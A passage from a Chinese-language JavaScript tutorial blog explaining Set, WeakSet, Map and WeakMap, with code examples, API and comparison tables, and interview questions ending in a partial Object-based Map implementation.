function_">has</span>(x)));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>对象引用管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> users = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trackUser</span>(<span class="hljs-params">user</span>) &#123;<br>  users.<span class="hljs-title function_">add</span>(user);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">untrackUser</span>(<span class="hljs-params">user</span>) &#123;<br>  users.<span class="hljs-title function_">delete</span>(user);<br>&#125;<br><br><span class="hljs-comment">// 自动去重：同一对象不会被重复添加</span><br></code></pre></td></tr></table></figure><h3 id="Set-的实现原理"><a href="#Set-的实现原理" class="headerlink" title="Set 的实现原理"></a>Set 的实现原理</h3><p>现代 JavaScript 引擎通常使用：</p><ul><li>哈希表作为底层实现</li><li>使用 开放寻址法 或 链表法 解决冲突</li><li>自动扩容机制（类似 Map）</li></ul><h2 id="WeakSet"><a href="#WeakSet" class="headerlink" title="WeakSet"></a>WeakSet</h2><h3 id="WeakSet-的定义"><a href="#WeakSet-的定义" class="headerlink" title="WeakSet 的定义"></a>WeakSet 的定义</h3><p>WeakSet 是 ES6 引入的一种特殊集合类型，与 Set 类似，也是不重复的值的集合。</p><h3 id="WeakSet-的核心特性"><a href="#WeakSet-的核心特性" class="headerlink" title="WeakSet 的核心特性"></a>WeakSet 的核心特性</h3><p><strong>成员类型限制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// WeakSet 的成员只能是对象和 Symbol 值，不能是其他类型的值</span><br><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br>ws.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 报错</span><br>ws.<span class="hljs-title function_">add</span>(<span class="hljs-title class_">Symbol</span>()) <span class="hljs-comment">// 不报错</span><br></code></pre></td></tr></table></figure><p><strong>弱引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;important&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> weakset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br><br>weakset.<span class="hljs-title function_">add</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakset.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 当对象不再被引用时</span><br>obj = <span class="hljs-literal">null</span>; <br><br><span class="hljs-comment">// 垃圾回收后，对象会自动从WeakSet移除</span><br><span class="hljs-comment">// weakset.has(原obj) 将返回 false</span><br></code></pre></td></tr></table></figure><p><strong>不可遍历</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br>ws.<span class="hljs-title function_">add</span>(&#123;&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-property">size</span>); <span class="hljs-comment">// undefined (无size属性)</span><br><br><span class="hljs-comment">// 以下操作都会报错：</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> item <span class="hljs-keyword">of</span> ws) &#123;&#125;<br>ws.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;)<br>[...ws]<br></code></pre></td></tr></table></figure><h3 id="WeakSet-的-API-详解"><a href="#WeakSet-的-API-详解" class="headerlink" title="WeakSet 的 API 详解"></a>WeakSet 的 API 详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new WeakSet(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">weakSet.has(value)</td><td align="left">检查值是否存在</td></tr><tr><td align="left">weakSet.add(value)</td><td align="left">添加值</td></tr><tr><td align="left">weakSet.delete(value)</td><td align="left">删除值</td></tr></tbody></table><p>WeakSet 没有 size 属性，不可遍历（即没有keys()、values()和entries()方法），因为成员都是弱引用，随时都可能消失。WeakSet 也没有 clear() 方法。</p><h3 id="WeakSet-和-Set-的区别"><a href="#WeakSet-和-Set-的区别" class="headerlink" title="WeakSet 和 Set 的区别"></a>WeakSet 和 Set 的区别</h3><table><thead><tr><th align="left">特性</th><th align="left">Set</th><th align="left">WeakSet</th></tr></thead><tbody><tr><td align="left">成员类型</td><td align="left">任意类型</td><td align="left">仅对象和 Symbol</td></tr><tr><td align="left">可枚举性</td><td align="left">可遍历</td><td align="left">不可遍历</td></tr><tr><td align="left">引用类型</td><td align="left">强引用</td><td align="left">弱引用</td></tr><tr><td align="left">自动清理</td><td align="left">否</td><td align="left">是</td></tr></tbody></table><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="Map-的定义和基本用法"><a href="#Map-的定义和基本用法" class="headerlink" title="Map 的定义和基本用法"></a>Map 的定义和基本用法</h3><p>Map 是 ES6 引入的新的数据结构，是一种键值对集合类型（Hash结构），使用 new 关键字创建 Map 结构实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()<br></code></pre></td></tr></table></figure><p>Map 构造函数可以接受一个数组作为参数，数组成员是一个个表示键值对的数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> items = [<br>  [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;张三&#x27;</span>],<br>  [<span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;Author&#x27;</span>]<br>];<br><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br></code></pre></td></tr></table></figure><h3 id="Map-的核心特性"><a href="#Map-的核心特性" class="headerlink" title="Map 的核心特性"></a>Map 的核心特性</h3><p><strong>键的灵活性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-comment">// 支持任意类型作为键</span><br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;number&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(&#123;<span class="hljs-attr">id</span>: <span class="hljs-number">1</span>&#125;, <span class="hljs-string">&#x27;object&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-string">&#x27;function&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-property">size</span>); <span class="hljs-comment">// 4</span><br></code></pre></td></tr></table></figure><p><strong>键值相等性判断</strong></p><p>Map 和 Set 一样使用 SameValueZero 算法：</p><ul><li>NaN 被视为相等</li><li>+0 和 -0 被视为相等</li><li>对象按引用比较</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>map.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;value&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(obj)); <span class="hljs-comment">// &#x27;value&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(&#123;&#125;)); <span class="hljs-comment">// undefined (不同引用)</span><br></code></pre></td></tr></table></figure><h3 id="Map-的基础-API详解"><a href="#Map-的基础-API详解" class="headerlink" title="Map 的基础 API详解"></a>Map 的基础 API详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new Map(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">map.set(key, value)</td><td align="left">添加&#x2F;更新键值对</td></tr><tr><td align="left">map.get(key)</td><td align="left">获取对应值</td></tr><tr><td align="left">map.has(key)</td><td align="left">检查键是否存在</td></tr><tr><td align="left">map.delete(key)</td><td align="left">删除键值对</td></tr><tr><td align="left">map.clear()</td><td align="left">清空集合</td></tr><tr><td align="left">map.size</td><td align="left">获取键值对的数量（非函数属性，不能 set.size()）</td></tr></tbody></table><h3 id="Map-的迭代操作"><a href="#Map-的迭代操作" class="headerlink" title="Map 的迭代操作"></a>Map 的迭代操作</h3><p>Map 结构原生提供三个遍历器生成函数和一个遍历方法</p><ul><li>map.values()：返回键值的遍历器</li><li>map.keys()：返回键名的遍历器</li><li>map.entries()：返回所有成员的遍历器</li><li>map.forEach()：遍历 Map 所有成员</li></ul><p>和 Set 一样，Map 的遍历顺序也是插入顺序，Map 的默认遍历器生成函数是它的 entries 方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([<br>  [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>],<br>  [<span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-number">30</span>]<br>]);<br><br><span class="hljs-comment">// 1. for...of 遍历</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> map) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, value);<br>&#125;<br><br><span class="hljs-comment">// 2. forEach 遍历</span><br>map.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, value);<br>&#125;);<br><br><span class="hljs-comment">// 3. 获取迭代器</span><br><span class="hljs-keyword">const</span> keys = map.<span class="hljs-title function_">keys</span>();    <span class="hljs-comment">// 键迭代器</span><br><span class="hljs-keyword">const</span> values = map.<span class="hljs-title function_">values</span>();<span class="hljs-comment">// 值迭代器</span><br><span class="hljs-keyword">const</span> entries = map.<span class="hljs-title function_">entries</span>(); <span class="hljs-comment">// 键值对迭代器</span><br></code></pre></td></tr></table></figure><h3 id="Map-的高级特性与应用"><a href="#Map-的高级特性与应用" class="headerlink" title="Map 的高级特性与应用"></a>Map 的高级特性与应用</h3><p><strong>性能优势</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 与 Object 的性能对比</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><span class="hljs-keyword">const</span> n = <span class="hljs-number">1000000</span>;<br><br><span class="hljs-comment">// 插入性能</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Object insert&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) obj[i] = i;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Object insert&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Map insert&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) map.<span class="hljs-title function_">set</span>(i, i);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Map insert&#x27;</span>);<br><br><span class="hljs-comment">// 查找性能</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Object lookup&#x27;</span>);<br>obj[n/<span class="hljs-number">2</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Object lookup&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Map lookup&#x27;</span>);<br>map.<span class="hljs-title function_">get</span>(n/<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Map lookup&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>对象元数据存储</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 更优雅的元数据管理</span><br><span class="hljs-keyword">const</span> metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setMetadata</span>(<span class="hljs-params">obj, data</span>) &#123;<br>  metadata.<span class="hljs-title function_">set</span>(obj, data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getMetadata</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> metadata.<span class="hljs-title function_">get</span>(obj);<br>&#125;<br><br><span class="hljs-comment">// 避免直接修改对象属性</span><br></code></pre></td></tr></table></figure><h3 id="Map-与-Object-的对比"><a href="#Map-与-Object-的对比" class="headerlink" title="Map 与 Object 的对比"></a>Map 与 Object 的对比</h3><table><thead><tr><th align="left">特性</th><th align="left">Map</th><th align="left">Object</th></tr></thead><tbody><tr><td align="left">键类型</td><td align="left">任意值</td><td align="left">String&#x2F;Symbol</td></tr><tr><td align="left">键顺序</td><td align="left">插入顺序</td><td align="left">复杂规则(整数属性优先)</td></tr><tr><td align="left">size 属性</td><td align="left">直接获取</td><td align="left">需要手动计算</td></tr><tr><td align="left">迭代</td><td align="left">直接可迭代</td><td align="left">需要Object.keys()等转换</td></tr><tr><td align="left">性能</td><td align="left">频繁增删操作更优</td><td align="left">静态键值访问略快</td></tr><tr><td align="left">序列化</td><td align="left">需手动处理</td><td align="left">原生支持JSON序列化</td></tr><tr><td align="left">原型链污染</td><td align="left">完全隔离</td><td align="left">可能被污染</td></tr></tbody></table><h2 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h2><h3 id="WeakMap-的定义"><a href="#WeakMap-的定义" class="headerlink" title="WeakMap 的定义"></a>WeakMap 的定义</h3><p>WeakMap 和 Map 类似，也是用于生成键值对集合</p><h3 id="WeakMap-的核心特性"><a href="#WeakMap-的核心特性" class="headerlink" title="WeakMap 的核心特性"></a>WeakMap 的核心特性</h3><p><strong>弱引用键机制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> user = &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> &#125;;<br><span class="hljs-keyword">const</span> weakmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br>weakmap.<span class="hljs-title function_">set</span>(user, <span class="hljs-string">&#x27;user data&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakmap.<span class="hljs-title function_">has</span>(user)); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 当对象失去所有强引用时</span><br>user = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 垃圾回收后自动移除条目</span><br><span class="hljs-comment">// weakmap.has(原user) 将返回 false</span><br></code></pre></td></tr></table></figure><p><strong>键类型限制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> wm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-comment">// 仅允许对象(null 除外)和 Symbol作为键</span><br>wm.<span class="hljs-title function_">set</span>(&#123;&#125;, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">Symbol</span>(), <span class="hljs-number">2</span>) <span class="hljs-comment">// 不报错</span><br><br><span class="hljs-comment">// 原始值会报错</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;invalid&#x27;</span>); <span class="hljs-comment">// TypeError: Invalid value used as weak map key</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;invalid&#x27;</span>); <span class="hljs-comment">// TypeError</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">// TypeError</span><br></code></pre></td></tr></table></figure><h3 id="WeakMap-的-API-详解"><a href="#WeakMap-的-API-详解" class="headerlink" title="WeakMap 的 API 详解"></a>WeakMap 的 API 详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new WeakMap(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">weakMap.set(key, value)</td><td align="left">添加&#x2F;更新键值对</td></tr><tr><td align="left">weakMap.get(key)</td><td align="left">获取对应值</td></tr><tr><td align="left">weakMap.has(key)</td><td align="left">检查键是否存在</td></tr><tr><td align="left">weakMap.delete(key)</td><td align="left">删除键值对</td></tr></tbody></table><p>weakMap 没有 size 属性，不可遍历（即没有keys()、values()和entries()方法），因为成员都是弱引用，随时都可能消失。WeakMap 也没有 clear() 方法</p><h3 id="WeakMap-的特殊行为与边界情况"><a href="#WeakMap-的特殊行为与边界情况" class="headerlink" title="WeakMap 的特殊行为与边界情况"></a>WeakMap 的特殊行为与边界情况</h3><p><strong>键不可枚举</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> wm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">const</span> key = &#123;&#125;;<br>wm.<span class="hljs-title function_">set</span>(key, <span class="hljs-string">&#x27;secret&#x27;</span>);<br><br><span class="hljs-comment">// 无法通过反射获取键</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(key); <span class="hljs-comment">// []</span><br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(key);             <span class="hljs-comment">// []</span><br></code></pre></td></tr></table></figure><p><strong>垃圾回收不确定性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>wm.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;data&#x27;</span>);<br>obj = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 无法预测何时条目会被移除</span><br><span class="hljs-comment">// 依赖垃圾回收器运行</span><br></code></pre></td></tr></table></figure><p><strong>不可克隆</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 无法正确克隆WeakMap</span><br><span class="hljs-keyword">const</span> wm1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br>wm1.<span class="hljs-title function_">set</span>(&#123;&#125;, <span class="hljs-string">&#x27;value&#x27;</span>);<br><br><span class="hljs-keyword">const</span> wm2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>(wm1); <span class="hljs-comment">// 无效！</span><br><span class="hljs-comment">// 没有方法可以复制现有WeakMap的内容</span><br></code></pre></td></tr></table></figure><h3 id="WeakMap-和相关数据结构的区别"><a href="#WeakMap-和相关数据结构的区别" class="headerlink" title="WeakMap 和相关数据结构的区别"></a>WeakMap 和相关数据结构的区别</h3><table><thead><tr><th align="left">特性</th><th align="left">WeakMap</th><th align="left">Map</th><th align="left">WeakSet</th></tr></thead><tbody><tr><td align="left">键类型</td><td align="left">仅对象</td><td align="left">任意值</td><td align="left">仅对象</td></tr><tr><td align="left">值类型</td><td align="left">任意值</td><td align="left">任意值</td><td align="left">无值（仅存储键）</td></tr><tr><td align="left">可枚举性</td><td align="left">不可枚举</td><td align="left">可枚举</td><td align="left">不可枚举</td></tr><tr><td align="left">内存管理</td><td align="left">弱引用键</td><td align="left">强引用键值</td><td align="left">弱引用键</td></tr><tr><td align="left">使用场景</td><td align="left">私有数据&#x2F;元数据存储</td><td align="left">通用键值存储</td><td align="left">对象存在性检查</td></tr></tbody></table><h2 id="面试常见问题-6"><a href="#面试常见问题-6" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：请解释 Map 和 Object 的主要区别是什么？</strong></p><ul><li>键类型不同：Map 键可以是任意类型，Object 键只能是字符串或 Symbol 值</li><li>顺序保证：Map 严格按照插入顺序迭代，Object 则是数字键升序排序后其他按插入顺序</li><li>大小获取：Map 可以直接用 size 属性，Object 则需要 Object.keys(obj).length</li><li>性能：Map 增删改查操作更高效</li><li>序列化：Map 需要手动转为数组，Object 直接支持 JSON.stringify</li></ul><p><strong>Q：WeakMap 和 Map 的核心区别是什么？为什么要有 WeakMap？</strong></p><p>核心区别：</p><ul><li>键类型：Map 键可以是任意类型，WeakMap 键只能是对象和 Symbol</li><li>内存管理：WeakMap 键是弱引用，不阻止 GC 垃圾回收，Map 键是强引用</li><li>可访问性：WeakMap 不可遍历，Map 可以遍历所有键值</li></ul><p>为什么要有 WeakMap？</p><ul><li>防止内存泄露：当键对象不再使用时自动清除关联值</li><li>私有数据存储：实现真正无法外部访问的私有属性</li></ul><p><strong>Q：为什么 WeakMap 的键必须是对象？</strong></p><p>主要基于两个核心设计目标：</p><ul><li>内存管理：只有对象存在垃圾回收机制，原始值（字符串、数字等）在 JavaScript 中永生；弱引用机制仅对需要回收的对象有意义</li><li>技术实现限制：引擎底层通过对象指针实现弱引用，弱允许原始值会破坏弱引用设计初衷，导致永久占用内存</li></ul><p><strong>Q：Set 如何保证元素的唯一性？</strong></p><p>通过 SameValueZero 算法和底层哈希表现（插入时先计算哈希值定位桶，桶内遍历采用 SameValueZero 算法精确比对，存在相同值则覆盖，否则新增）</p><p><strong>Q：WeakSet 为什么没有 size 属性和遍历方法？</strong></p><p>弱引用设计约束：成员对象都是弱引用，随时可能被回收，计算 size 可能会得到非确定的结果，同样，遍历结果也不可靠</p><p><strong>Q：为什么 Map 要保持插入顺序而 Object 不保证？</strong></p><ul><li>设计目标差异：Map 是专门设计的键值集合，顺序是其核心特新要求，Object 不是</li><li>历史兼容性：Object 的乱序行为是历史包袱，Map 没有历史包袱，直接规范顺序保证</li><li>性能取舍：Map 用额外链表维护顺序（空间换时间），Object 为优化访问速度牺牲顺序</li></ul><p><strong>Q：WeakSet 在垃圾回收时的行为是怎样的？</strong></p><ul><li>自动清理：当 WeakSet 中的成员失去引用时，GC 垃圾回收器会将该对象从 WeakSet 中移除</li><li>不可观测性：无法直接观测到回收时机</li><li>内存影响：不会阻止其键对象被回收</li></ul><p><strong>Q: 如何用 Object 模拟实现一个 Map？</strong></p><p>核心实现思路：</p><p>（1）用 Symbol 保证唯一性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> _keys = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;keys&#x27;</span>);<br><span class="hljs-keyword">const</span> _values = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;values&#x27;</span>);<br></code></pre></td></tr></table></figure><p>（2）基本结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleMap</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>[_keys] = [];   <span class="hljs-comment">// 存储键</span><br>    <span class="hljs-variable language_">this</span>[_values] = []; <span class="hljs-comment">// 存储值</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）关键方法实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">indexOf</span>(key);<br>  <span class="hljs-keyword">if</span> (index === -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">push</span>(key);<br>    <span class="hljs-variable language_">this</span>[_values].<span class="hljs-title function_">push</span>(value);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">this</span>[_values][index] = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-title 